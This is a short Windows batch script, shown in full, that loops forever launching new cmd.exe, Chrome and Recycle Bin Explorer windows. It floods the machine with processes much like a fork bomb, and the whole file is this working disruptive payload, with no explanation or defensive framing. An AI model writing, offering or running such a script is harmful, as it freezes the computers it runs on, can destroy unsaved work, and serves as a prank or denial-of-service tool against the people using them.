@echo off
:HyperLoop
start cmd.exe
start chrome.exe
start explorer.exe shell:RecycleBinFolder
goto HyperLoop